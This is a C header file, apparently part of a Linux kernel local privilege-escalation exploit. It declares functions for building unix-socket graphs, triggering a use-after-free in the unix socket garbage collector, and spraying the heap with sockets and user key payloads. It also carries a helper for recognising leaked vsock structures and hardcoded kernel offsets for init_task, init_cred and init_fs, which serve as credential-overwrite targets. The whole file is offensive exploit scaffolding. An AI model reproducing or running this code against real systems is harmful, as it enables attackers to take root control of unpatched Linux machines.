#ifndef EXPLOIT_H
#define EXPLOIT_H

//#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <sched.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/un.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <keyutils.h>

#include <linux/sockios.h>
#include <linux/vm_sockets.h>

//#include <linux/un.h>

typedef uint8_t u8;
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;

void unix_error(const char *msg);
void Pthread_error(const char *msg, int error_code);
int Socket(int domain, int type, int protocol);
void Socketpair(int domain, int type, int protocol, int socket_vector[2]);
void Setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen);
void Connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
void Bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
void Getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
void Listen(int sockfd, int backlog);
int Accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
ssize_t Sendmsg(int socket, const struct msghdr *message, int flags);
ssize_t Recvmsg(int socket, struct msghdr *message, int flags);
ssize_t Send(int sockfd, const void *buf, size_t size, int flags);
ssize_t Sendto(int sockfd, const void *msg, size_t length, int flags, const struct sockaddr *dst_addr, socklen_t dst_len);
ssize_t Recv(int sockfd, void *buf, size_t size, int flags);
void *Calloc(size_t nelem, size_t elsize);
void Close(int fd);
void Ioctl(int fd, unsigned long op, unsigned long arg);
void Unshare(int flags);
void Getrlimit(int resource, struct rlimit *rlim);
void Setrlimit(int resource, const struct rlimit *rlim);
void Sched_setaffinity(pid_t pid, size_t cpusetsize, const cpu_set_t *cpuset);
void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);
void Pthread_join(pthread_t thread, void **retval);
void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset);
void pin_thread_on_cpu(int cpu);
void sendfds(
        int unix_sockfd,
        void *data,
        size_t data_len,
        int *fds,
        int fds_len,
        struct sockaddr_un addr,
        socklen_t addrlen
);
void recvfds(int unix_sockfd, void *data, size_t data_len, int *fds, int fds_len, int msg_peek);

struct unix_gc_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool quit;
        bool trigger_gc;
        bool gc_complete;
        int trigger_gc_fd;
        int wait_for_gc_fd;
};

void *unix_gc_thread_fn(void *arg);
void unix_gc_thread_init(struct unix_gc_thread *t);
void unix_gc_thread_cleanup(struct unix_gc_thread *t);
void unix_gc_trigger(struct unix_gc_thread *t);
void unix_gc_wait(struct unix_gc_thread *t);
void unix_gc_thread_quit(struct unix_gc_thread *t);

#define SCM_MAX_FD	253


#define UAF_OOB_SKB_BYTE_DATA                   (u8)0x41
#define RECLAIM_UAF_OOB_SKB_BYTE_DATA_1         (u8)0x42
#define RECLAIM_UAF_OOB_SKB_BYTE_DATA_2         (u8)0x43

struct exploit_kernel_unix_graph {
        int stream_unix_socket_A_fd;
        int stream_unix_socket_B_fd;
        int stream_unix_socket_C_fd;
        int dgram_unix_socket_D_fd;
};

void exploit_kernel_unix_graph_prepare(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_build_stage_1(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_build_stage_2(struct exploit_kernel_unix_graph *p);
void exploit_kernel_unix_graph_cleanup(struct exploit_kernel_unix_graph *p);

struct cyclic_kernel_unix_graph {
        int dgram_unix_socket_fd;
};

void cyclic_kernel_unix_graph_prepare(struct cyclic_kernel_unix_graph *p);
void cyclic_kernel_unix_graph_build(struct cyclic_kernel_unix_graph *p);
void cyclic_kernel_unix_graph_cleanup(struct cyclic_kernel_unix_graph *p);

struct kernel_unix_vertex_spray {
        int vertex_count;
        int *dgram_unix_socket_fds;
};

void kernel_unix_vertex_spray_prepare(struct kernel_unix_vertex_spray *p, int spray_count);
void kernel_unix_vertex_spray_trigger_alloc(struct kernel_unix_vertex_spray *p);
void kernel_unix_vertex_spray_trigger_free(struct kernel_unix_vertex_spray *p);
void kernel_unix_vertex_spray_cleanup(struct kernel_unix_vertex_spray *p);

void prepare_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct cyclic_kernel_unix_graph *cyclic_kernel_unix_graph,
	struct kernel_unix_vertex_spray *kernel_unix_vertex_spray,
	struct unix_gc_thread *unix_gc_thread
);

bool trigger_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct unix_gc_thread *unix_gc_thread
);

bool uaf_success(int victim_socket_fd);

#define SKBUFF_HEAD_CACHE_OBJS_PER_SLAB         16
#define VSOCKPAIR_SEND_SIDE                     0
#define VSOCKPAIR_RECV_SIDE                     1
#define MAX_PORT_RETRIES                        24
#define LAST_RESERVED_PORT                      1023

void setup_nofile_rlimit(void);

static inline void wait_for_inspection(const char *msg)
{
        fprintf(stderr, "%s\n", msg);
        getchar();
}

struct callback_head {
	void *next;
	void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head

#define __aligned(x)                    __attribute__((__aligned__(x)))

struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};

void keyutils_error(char *msg)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
	exit(EXIT_FAILURE);
}

key_serial_t Add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
	key_serial_t key = add_key(type, description, payload, plen, ringid);
	if (key < 0)
		keyutils_error("add_key");
	return key;
}

long Keyctl_read(key_serial_t id, char *buffer, size_t buflen)
{
	long rc = keyctl_read(id, buffer, buflen);
	if (rc < 0)
		keyutils_error("keyctl_read");
	return rc;
}

void Keyctl_unlink(key_serial_t id, key_serial_t ringid)
{
	if (keyctl_unlink(id, ringid) < 0)
		keyutils_error("keyctl_unlink");
}

key_serial_t user_key_payload_alloc(const char *desc, void *data, size_t n)
{
	key_serial_t key = Add_key("user", desc, data, n, KEY_SPEC_USER_KEYRING);
	return key;
}

void user_key_payload_read(key_serial_t key, void *buf, long n)
{
	if (Keyctl_read(key, (char *)buf, n) != n)
		exit(EXIT_FAILURE);
}

void user_key_payload_free(key_serial_t key)
{
	if (key != -1)
		Keyctl_unlink(key, KEY_SPEC_USER_KEYRING);
}

struct sk_buff_head {
        void *next;
        void *prev;
        u32 qlen;
        int lock;
};

struct virtio_vsock_sock {
	struct vsock_sock *vsk;
	int tx_lock;
	int rx_lock;
	u32 tx_cnt;
	u32 peer_fwd_cnt;
	u32 peer_buf_alloc;
	size_t bytes_unsent;
	u32 fwd_cnt;
	u32 last_fwd_cnt;
	u32 rx_bytes;
	u32 buf_alloc;
	u32 buf_used;
	struct sk_buff_head rx_queue;
	u32 msg_count;
};

static void virtio_vsock_sock_dump(struct virtio_vsock_sock *vvs)
{
        printf("**** Dump virtio_vsock_sock ****\n");
        printf("vsk: 0x%016lx\n", (u64)vvs->vsk);
        printf("tx_lock: %d\n", vvs->tx_lock);
        printf("rx_lock: %d\n", vvs->rx_lock);
        printf("tx_cnt: %u\n", vvs->tx_cnt);
        printf("peer_fwd_cnt: %u\n", vvs->peer_fwd_cnt);
        printf("peer_buf_alloc: %u\n", vvs->peer_buf_alloc);
        printf("bytes_unsent: %u\n", vvs->bytes_unsent);
        printf("fwd_cnt: %u\n", vvs->fwd_cnt);
        printf("last_fwd_cnt: %u\n", vvs->last_fwd_cnt);
        printf("rx_bytes: %u\n", vvs->rx_bytes);
        printf("buf_alloc: %u\n", vvs->buf_alloc);
        printf("buf_used: %u\n", vvs->buf_used);
        printf("rx_queue.next: 0x%016lx\n", (u64)(vvs->rx_queue.next));
        printf("rx_queue.prev: 0x%016lx\n", (u64)(vvs->rx_queue.prev));
        printf("rx_queue.qlen: %u\n", vvs->rx_queue.qlen);
        printf("rx_queue.lock: %d\n", vvs->rx_queue.lock);
        printf("msg_count: %u\n", vvs->msg_count);
}

static inline bool is_data_look_like_virtio_vsock_sock(void *data)
{
        struct virtio_vsock_sock *vvs = (struct virtio_vsock_sock *)data;
        u64 vsk = (u64)vvs->vsk;
        u64 rx_queue_next = (u64)(vvs->rx_queue.next);
        u64 rx_queue_prev = (u64)(vvs->rx_queue.prev);

        return  (vsk >> 48) == 0xFFFF &&
                vvs->tx_lock == 0 &&
                vvs->rx_lock == 0 &&
                (rx_queue_next >> 48) == 0xFFFF &&
                (rx_queue_prev >> 48) == 0xFFFF &&
                rx_queue_next == rx_queue_prev &&
                vvs->rx_queue.lock == 0;
}

#define TOTAL_USER_KEY_PAYLOAD_1                170
#define TOTAL_USER_KEY_PAYLOAD_2                85
#define TOTAL_USER_KEY_PAYLOAD_3                85
#define TOTAL_USER_KEY_PAYLOAD_4                1
#define SKB_LEN_OVERLAP_OFFSET                  56
#define UNIXCB_CONSUMED_OFFSET                  12
#define SKB_USERS_OFFSET                        60


#define USER_KEY_PAYLOAD_DATALEN_OFFSET         40

struct gate_struct {
        uint16_t offset_low;
        uint16_t segment;
        uint16_t bits;
        uint16_t offset_middle;
        uint32_t offset_high;
        uint32_t reserved;
};

/*
static u64 asm_exc_divide_error_offset_from_kernel_base = 0x1801030;
static u64 init_task = 0x300d0c0;
static u64 init_cred = 0x30953a0;
static u64 init_fs = 0x3209a20;
*/

static u64 asm_exc_divide_error_offset_from_kernel_base = 0x1801030;
static u64 init_task = 0x300d0c0;
static u64 init_cred = 0x30953a0;
static u64 init_fs = 0x3209a20;

#endif // EXPLOIT_H